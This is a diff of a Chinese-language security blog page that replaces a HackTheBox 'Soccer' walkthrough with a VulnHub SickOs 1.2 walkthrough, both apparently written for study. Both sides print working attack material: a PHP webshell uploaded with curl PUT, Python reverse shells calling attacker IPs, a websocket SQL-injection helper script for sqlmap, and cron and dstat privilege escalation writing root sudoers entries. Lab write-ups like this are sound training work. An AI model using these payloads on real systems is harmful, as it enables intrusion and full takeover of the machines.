@@ -4,8 +4,19 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Soccer：SQL注入以及linpeas提权工具的使用, SummerOne">
-    <meta name="description" content="HTB初体验！VPN不稳定，SQL注入费了不少功夫">
+    <meta name="keywords" content="22-sick0s1.2-vulnhub, SummerOne">
+    <meta name="description" content="
+靶机下载地址
+
+1.信息提取扫描端口：
+
+
+目录扫描：
+
+扫描到&amp;#x2F;test&amp;#x2F;目录，点击又回到主页
+
+2.检查网页可用http请求检查网页可用http请求
+curl -v -X OPTIONS 192.168.56.5&amp;">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +28,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Soccer：SQL注入以及linpeas提权工具的使用 | SummerOne</title>
+    <title>22-sick0s1.2-vulnhub | SummerOne</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -320,12 +331,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Soccer：SQL注入以及linpeas提权工具的使用</h1>
+                    <h1 class="description center-align post-title">22-sick0s1.2-vulnhub</h1>
                 </div>
             </div>
         </div>
@@ -347,29 +358,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/oscp/">
-                                <span class="chip bg-color">oscp</span>
-                            </a>
-                        
-                            <a href="/tags/hackthebox/">
-                                <span class="chip bg-color">hackthebox</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/walkthrough/" class="post-category">
-                                walkthrough
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -378,7 +372,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-02-15
+                    2023-03-27
                 </div>
                 
 
@@ -408,184 +402,53 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/519">靶机地址</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/sickos-12,144/">靶机下载地址</a></p>
 </blockquote>
-<p><img src="/posts/91a184ba/18XZxVTFecE4QOhMMFA5VHg-16764286316592.png"></p>
-<h2 id="0-HTB配置"><a href="#0-HTB配置" class="headerlink" title="0.HTB配置"></a>0.HTB配置</h2><p>Hackthebox的靶机与vulnhub不同，不需要下载，为在线靶场。但是需要VPN连接才能测试靶机。首先需要先下载vpn文件，在右上角的下拉菜单中选择VPN接入点和服务，这里选的都是欧洲免费节点：</p>
-<p><img src="/posts/91a184ba/image-20230215202801084.png"></p>
-<p>然后点击下载vpn文件xxx.opvn，把该文件放到kali虚拟机中，kali自带openvpn程序，执行以下命令开启vpn。</p>
-<pre class="line-numbers language-none"><code class="language-none">openvpn xxx.opvn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>看到下图的红框中字样说明vpn连接成功，kali系统右上角会显示当前vpn的本机IP地址。而靶机IP地址是在启动hackthebox的machine后，在其网页中显示。</p>
-<p><img src="/posts/91a184ba/image-20230215202902364.png"></p>
-<p><img src="/posts/91a184ba/image-20230215203630108.png"></p>
-<p><img src="/posts/91a184ba/image-20230215203546151.png"></p>
-<p>现在知道了本机和靶机IP地址，可以开始测试啦！</p>
-<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>端口扫描：</p>
-<p><img src="/posts/91a184ba/image-20230215102854518.png"></p>
-<p>浏览器访问80端口，ip地址转为域名soccer.htb</p>
-<p><img src="/posts/91a184ba/image-20230215102958170.png"></p>
-<p>将域名加入&#x2F;etc&#x2F;hosts文件：</p>
-<pre class="line-numbers language-none"><code class="language-none">echo 10.10.11.194 soccer.htb &gt;&gt; &#x2F;etc&#x2F;hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>域名添加后，再次访问可以看到网页内容。但是检查了网页后，并没有发现可利用的地方。</p>
-<p><img src="/posts/91a184ba/image-20230215155217117.png"></p>
-<p>浏览器9091端口，没有有用信息：</p>
-<p><img src="/posts/91a184ba/image-20230215104510749.png"></p>
+<h2 id="1-信息提取"><a href="#1-信息提取" class="headerlink" title="1.信息提取"></a>1.信息提取</h2><p>扫描端口：</p>
+<p><img src="/posts/f93955ec/image-20230327093819405.png"></p>
+<p><img src="/posts/f93955ec/image-20230327093852141.png"></p>
 <p>目录扫描：</p>
-<pre class="line-numbers language-none"><code class="language-none">gobuster dir -u http:&#x2F;&#x2F;soccer.htb -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;SVNDigger&#x2F;all-dirs.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/posts/f93955ec/image-20230327100026682.png"></p>
+<p>扫描到&#x2F;test&#x2F;目录，点击又回到主页</p>
+<p><img src="/posts/f93955ec/image-20230327100227038.png"></p>
+<h2 id="2-检查网页可用http请求"><a href="#2-检查网页可用http请求" class="headerlink" title="2.检查网页可用http请求"></a>2.检查网页可用http请求</h2><p>检查网页可用http请求</p>
+<pre class="line-numbers language-none"><code class="language-none">curl -v -X OPTIONS 192.168.56.5&#x2F;test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/posts/91a184ba/image-20230215155458131.png"></p>
-<p>发现了&#x2F;tiny目录，发现为tiny文件管理系统。</p>
-<p><img src="/posts/91a184ba/image-20230215110635261.png"></p>
-<h2 id="2-Tiny文件管理反弹shell"><a href="#2-Tiny文件管理反弹shell" class="headerlink" title="2.Tiny文件管理反弹shell"></a>2.Tiny文件管理反弹shell</h2><p>尝试用<a target="_blank" rel="noopener" href="https://github.com/prasathmani/tinyfilemanager">tiny文件管理系统</a>的默认账密登录：</p>
-<blockquote>
-<p>username :admin</p>
-<p>password: admin@123</p>
-</blockquote>
-<p>或者</p>
-<blockquote>
-<p>username: user</p>
-<p>password: 12345</p>
-</blockquote>
-<p>登录成功！</p>
-<p><img src="/posts/91a184ba/image-20230215112327281.png"></p>
-<p>在这里看到了<a target="_blank" rel="noopener" href="http://soccer.htb/">http://soccer.htb</a> 页面的主页html和图片内容，在网页源码中可以看到这些文件的url。例如ground1.jpg可以通过<a target="_blank" rel="noopener" href="http://soccer.htb/ground1.jpg">http://soccer.htb/ground1.jpg</a> 访问。</p>
-<p><img src="/posts/91a184ba/image-20230215155727957.png"></p>
-<p>那么如果上传shell文件，则也可以通过上述路径触发反弹连接。</p>
-<p> 点击“uploads”上传shell文件：</p>
-<p><img src="/posts/91a184ba/image-20230215200817188-16768551890431.png"></p>
-<p>然后在upload路径下可以看到上传的文件，点击后面的“链接”按钮，就可以获得文件的访问url。</p>
-<p><img src="/posts/91a184ba/image-20230215201818304-16768551890442.png"></p>
-<p>这里注意：后台有一个程序会定期的清空upload目录，如果动作慢了，上传文件就会被删除。</p>
-<p>在kali中监听端口，然后访问反弹shell的url，反弹shell成功！</p>
-<p><img src="/posts/91a184ba/image-20230215201940733-16768551890443.png"></p>
-<h2 id="3-Websocket的SQL注入"><a href="#3-Websocket的SQL注入" class="headerlink" title="3.Websocket的SQL注入"></a>3.Websocket的SQL注入</h2><p>当前权限为www-data。在**&#x2F;etc&#x2F;nginx&#x2F;sites-enabled**目录中，发现了子域名。</p>
-<p><img src="/posts/91a184ba/image-20230215204044970-16768555593334.png"></p>
-<p>把soc-player.soccer.hackthebox加入到&#x2F;etc&#x2F;hosts文件中，然后访问<a target="_blank" rel="noopener" href="http://soc-player.soccer.hackthebox/">http://soc-player.soccer.hackthebox/</a></p>
-<p>与soccer.hackthebox不同的是，这个页面可以进行注册和登录，所以我们注册一个账号并登录：</p>
-<p><img src="/posts/91a184ba/image-20230215204701567-16768555593345.png"></p>
-<p>检查网页源码，看到这是一个验票器，验证地址是一个websocket，地址是ws:&#x2F;&#x2F;soc-player.soccer.hackthebox:9001 ，提交的数据是json，格式如：</p>
-<pre class="line-numbers language-none"><code class="language-none">“id&quot;:&quot;93570&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/posts/f93955ec/image-20230327100705485.png"></p>
+<p>允许put方法，尝试上传webshell</p>
+<pre class="line-numbers language-none"><code class="language-none">curl -v -X PUT -d &#39;&lt;?php echo system($_REQUEST[&#39;cmd&#39;]);?&gt;&#39; http:&#x2F;&#x2F;192.168.56.5&#x2F;test&#x2F;webshell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/posts/91a184ba/image-20230215210952350-16768555593346.png"></p>
-<p><img src="/posts/91a184ba/image-20230215211032418-16768555593347.png"></p>
-<p>这个id看起来可以作为sql注入点，查资料“<a target="_blank" rel="noopener" href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">websocket如何进行sql注入</a>”，发现其提供一python脚本，将其修改后如下：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> http<span class="token punctuation">.</span>server <span class="token keyword">import</span> SimpleHTTPRequestHandler
-<span class="token keyword">from</span> socketserver <span class="token keyword">import</span> TCPServer
-<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote<span class="token punctuation">,</span> urlparse
-<span class="token keyword">from</span> websocket <span class="token keyword">import</span> create_connection
+<p><img src="/posts/f93955ec/image-20230327100854976.png"></p>
+<p>测试一下</p>
+<p><img src="/posts/f93955ec/image-20230327100952678.png"></p>
+<p>反弹连接：</p>
+<p>python反弹shell代码：</p>
+<pre class="line-numbers language-none"><code class="language-none">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.3&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-ws_server <span class="token operator">=</span> <span class="token string">"ws://soc-player.soccer.hackthebox:9091"</span> <span class="token comment"># I changed here</span>
+<p><img src="/posts/f93955ec/image-20230327114300208.png"></p>
+<p><img src="/posts/f93955ec/image-20230327114329083.png" alt="反弹连接成功"></p>
+<p><strong>这里遇到个坑</strong>：靶机应该配置了防火墙，当反弹连接设置为4444,1234等端口时，无法反弹连接成功。只有当设置为其它应用常用的端口，比如443,8080才可以。</p>
+<h2 id="3-Linux-Cron-Job-提权"><a href="#3-Linux-Cron-Job-提权" class="headerlink" title="3.Linux Cron Job 提权"></a>3.Linux Cron Job 提权</h2><p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&spm=1001.2101.3001.7020">定时任务</a>（cron job）可以用来设置周期执行的命令，提权的原理为计划任务以root权限运行，计划任务中的脚本其他用户有写入的权限，或者脚本所属组为其他用户，则可以进行计划任务提权。</p>
+<p>查看&#x2F;etc&#x2F;cron.daily文件夹，查看定时任务。</p>
+<p><img src="/posts/f93955ec/image-20230327145629817.png"></p>
+<p>chkrootkit存在<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/33899">提权漏洞</a>。这个漏洞是在&#x2F;tmp文件夹创建update文件，chkrootkit程序就会定时去以root身份执行它。</p>
+<p>创建update文件，把www-data用户添加到sudo权限。</p>
+<pre class="line-numbers language-none"><code class="language-none">echo &#39;echo &quot;www-data ALL&#x3D;NOPASSWD: ALL&quot; &gt;&gt; &#x2F;etc&#x2F;sudoers &amp;&amp; chmod 440 &#x2F;etc&#x2F;sudoers&#39; &gt; &#x2F;tmp&#x2F;update
+&lt; ALL&quot; &gt;&gt; &#x2F;etc&#x2F;sudoers &amp;&amp; chmod 440 &#x2F;etc&#x2F;sudoers&#39; &gt; &#x2F;tmp&#x2F;update <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<span class="token keyword">def</span> <span class="token function">send_ws</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
-	ws <span class="token operator">=</span> create_connection<span class="token punctuation">(</span>ws_server<span class="token punctuation">)</span>
-	<span class="token comment"># If the server returns a response on connect, use below line	</span>
-	<span class="token comment">#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here</span>
-	
-	<span class="token comment"># For our case, format the payload in JSON</span>
-	message <span class="token operator">=</span> unquote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">)</span> <span class="token comment"># replacing " with ' to avoid breaking JSON structure</span>
-	data <span class="token operator">=</span> <span class="token string">'&#123;"id":"%s"&#125;'</span> <span class="token operator">%</span> message <span class="token comment"># I changed here</span>
-
-	ws<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
-	resp <span class="token operator">=</span> ws<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
-	ws<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-	<span class="token keyword">if</span> resp<span class="token punctuation">:</span>
-		<span class="token keyword">return</span> resp
-	<span class="token keyword">else</span><span class="token punctuation">:</span>
-		<span class="token keyword">return</span> <span class="token string">''</span>
-
-<span class="token keyword">def</span> <span class="token function">middleware_server</span><span class="token punctuation">(</span>host_port<span class="token punctuation">,</span>content_type<span class="token operator">=</span><span class="token string">"text/plain"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-
-	<span class="token keyword">class</span> <span class="token class-name">CustomHandler</span><span class="token punctuation">(</span>SimpleHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
-		<span class="token keyword">def</span> <span class="token function">do_GET</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
-			self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
-			<span class="token keyword">try</span><span class="token punctuation">:</span>
-				payload <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>self<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">.</span>query<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
-			<span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
-				payload <span class="token operator">=</span> <span class="token boolean">False</span>
-				
-			<span class="token keyword">if</span> payload<span class="token punctuation">:</span>
-				content <span class="token operator">=</span> send_ws<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-			<span class="token keyword">else</span><span class="token punctuation">:</span>
-				content <span class="token operator">=</span> <span class="token string">'No parameters specified!'</span>
-
-			self<span class="token punctuation">.</span>send_header<span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span> content_type<span class="token punctuation">)</span>
-			self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
-			self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-			<span class="token keyword">return</span>
-
-	<span class="token keyword">class</span> <span class="token class-name">_TCPServer</span><span class="token punctuation">(</span>TCPServer<span class="token punctuation">)</span><span class="token punctuation">:</span>
-		allow_reuse_address <span class="token operator">=</span> <span class="token boolean">True</span>
-
-	httpd <span class="token operator">=</span> _TCPServer<span class="token punctuation">(</span>host_port<span class="token punctuation">,</span> CustomHandler<span class="token punctuation">)</span>
-	httpd<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Starting MiddleWare Server"</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Send payloads in http://localhost:8081/?id=*"</span><span class="token punctuation">)</span>
-
-<span class="token keyword">try</span><span class="token punctuation">:</span>
-	middleware_server<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token number">8081</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
-	<span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>该脚本将在端口 8081 上创建一个 HTTP 服务器并提取第一个 GET 参数值，将值发送到  <code>send_ws</code> 函数，在那里它将按照易受攻击的 Web 应用程序的要求格式化为 JSON 消息。然后它将与  <code>ws_server</code> 变量中提到的服务器端点建立 WebSocket 连接并发送SQL注入payload。</p>
-<p>脚本准备好了，先运行脚本，再运行sqlmap：</p>
-<pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;localhost:8081&#x2F;?id&#x3D;1 --dump-all --exclude-sysdbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>得到soccer_db数据库的accounts表</p>
-<pre class="line-numbers language-none"><code class="language-none">+------+-------------------+----------+----------------------+
-| id   | email             | username | password             |
-+------+-------------------+----------+----------------------+
-| 1324 | player@player.hackthebox | player   | PlayerOftheMatch2022 |
-+------+-------------------+----------+----------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>用ssh连接，以player用户身份登录靶机系统，获得user flag。</p>
-<pre class="line-numbers language-none"><code class="language-none">ssh player@soccer.hackthebox<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>  密码：PlayerOftheMatch2022</p>
-<p><img src="/posts/91a184ba/image-20230215233707819-16768555593348.png"></p>
-<h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h2><p>利用本地提权工具<a target="_blank" rel="noopener" href="https://www.kali.org/tools/peass-ng/">linpeas</a>查找提权向量，把linpeas.sh上传至靶机，然后执行：</p>
-<pre class="line-numbers language-none"><code class="language-none">.&#x2F;linpeas.sh -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>扫描到<strong>doas</strong>程序的配置文件中，写道player用户可以无密码以root身份执行<strong>dstat</strong>程序：</p>
-<p><img src="/posts/91a184ba/image-20230217205502975-16768555593349.png"></p>
-<p>这里首先要清楚相关的两个程序是什么：</p>
-<p><a target="_blank" rel="noopener" href="https://man.openbsd.org/doas">doas</a>：以其他用户身份执行命令，类似于sudo。可以用-u参数指定用户。</p>
-<p><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/dstat">dstat</a>：是ifstat,vmstat等命令的替代。这里知道我们可以用root身份执行它就行了。</p>
-<p>那么怎样把root shell的payload借dstat执行呢？先搜索一下这个程序的相关文件：</p>
-<pre class="line-numbers language-none"><code class="language-none">find &#x2F; -name dstat -type d 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/posts/91a184ba/image-20230217210559143-167685555933410.png"></p>
-<p><img src="/posts/91a184ba/image-20230217210715104-167685555933411.png"></p>
-<p>与dstat程序的手册说明对比，得知这个路径下，全部都是dstat程序的插件，统一命名为dstat_xxx.py，调用的时候就加参数–xxx。</p>
-<p><img src="/posts/91a184ba/image-20230217211122215-167685555933412.png" alt="dstat插件说明"></p>
-<p>那么我们创建一个python shell插件，在&#x2F;tmp文件夹创建dstat_soccer.py：</p>
-<pre class="line-numbers language-none"><code class="language-none">touch dstat_soccer.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>python文件内容：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os<span class="token punctuation">;</span>
-s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>
-s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"10.10.16.11"</span><span class="token punctuation">,</span><span class="token number">2929</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">import</span> pty<span class="token punctuation">;</span> pty<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>然后复制到**&#x2F;usr&#x2F;local&#x2F;share&#x2F;dstat文件夹**，这个文件夹可以写入且程序也会寻找这个目录下的插件：</p>
-<pre class="line-numbers language-none"><code class="language-none">cp dstat_soccer.py &#x2F;usr&#x2F;local&#x2F;share&#x2F;dstat&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>最后，在本机监听端口等待反连，然后以root身份执行dstat程序插件</p>
-<pre class="line-numbers language-none"><code class="language-none">doas -u root &#x2F;usr&#x2F;bin&#x2F;dstat --soccer<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>成功提权到root，并获取flag：</p>
-<p><img src="/posts/91a184ba/image-20230217213738381-167685555933513.png"></p>
-<p>虽然磕磕绊绊，但是第一个HTB靶机收获很多，呱唧呱唧！</p>
-<p><img src="/posts/91a184ba/image-20230217213942868-167685555933514.png"></p>
+<p>将文件加执行权限，然后等待一会儿，输入sudo su命令，成功提权到root</p>
+<p><img src="/posts/f93955ec/image-20230327154056964.png"></p>
+<p><img src="/posts/f93955ec/image-20230327154238546.png" alt="得到flag"></p>
+<p>最后来看一下，是什么设置导致反弹连接多数端口不可用。用<strong>iptables -L</strong>命令</p>
+<p><img src="/posts/f93955ec/image-20230327154420701.png"></p>
+<p>靶机定制了策略，值允许上图中的那几个端口开放，因此导致我浪费了大量时间检查靶机的网络问题。</p>
+<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>这个靶机我还是接触到了全新的东西：</p>
+<ul>
+<li>curl命令检查http请求方法，上传reverse shell；</li>
+<li>定时任务（corn job）提权，有一个任务文件夹：&#x2F;etc&#x2F;cron.daily</li>
+<li>给当前用户添加sudo权限来提权</li>
+<li>注意靶机是否设置防火墙只允许个别端口进行数据传输。</li>
+</ul>
 
                 
             </div>
@@ -612,7 +475,7 @@ os<span class="token punctuation">.</span>dup2<span class="token punctuation">(<
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://summerone111.github.io/posts/91a184ba.html">https://summerone111.github.io/posts/91a184ba.html</a>
+                    <a href="https://summerone111.github.io/posts/f93955ec.html">https://summerone111.github.io/posts/f93955ec.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -649,15 +512,7 @@ os<span class="token punctuation">.</span>dup2<span class="token punctuation">(<
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/oscp/">
-                                    <span class="chip bg-color">oscp</span>
-                                </a>
-                            
-                                <a href="/tags/hackthebox/">
-                                    <span class="chip bg-color">hackthebox</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -698,70 +553,18 @@ os<span class="token punctuation">.</span>dup2<span class="token punctuation">(<
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/1e9c1fe3.html">
+                <a href="/posts/f93955ec.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="VulnOSv2：注意仔细检查网页中的子目录提示">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="22-sick0s1.2-vulnhub">
                         
-                        <span class="card-title">VulnOSv2：注意仔细检查网页中的子目录提示</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-02-16
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/walkthrough/" class="post-category">
-                                    walkthrough
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/vulnhub/">
-                        <span class="chip bg-color">vulnhub</span>
-                    </a>
-                    
-                    <a href="/tags/oscp/">
-                        <span class="chip bg-color">oscp</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/posts/101affbe.html">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="Stapler：Nikto扫描发现关键目录">
-                        
-                        <span class="card-title">Stapler：Nikto扫描发现关键目录</span>
+                        <span class="card-title">22-sick0s1.2-vulnhub</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -772,14 +575,52 @@ os<span class="token punctuation">.</span>dup2<span class="token punctuation">(<
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-02-04
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-27
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Summer One
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/23dbe738.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="域渗透基础">
+                        
+                        <span class="card-title">域渗透基础</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-20
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/walkthrough/" class="post-category">
-                                    walkthrough
+                            <a href="/categories/theory/" class="post-category">
+                                    theory
                                 </a>
                             
                             
@@ -789,12 +630,12 @@ os<span class="token punctuation">.</span>dup2<span class="token punctuation">(<
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/vulnhub/">
-                        <span class="chip bg-color">vulnhub</span>
+                    <a href="/tags/tryhackme/">
+                        <span class="chip bg-color">tryhackme</span>
                     </a>
                     
-                    <a href="/tags/oscp/">
-                        <span class="chip bg-color">oscp</span>
+                    <a href="/tags/work/">
+                        <span class="chip bg-color">work</span>
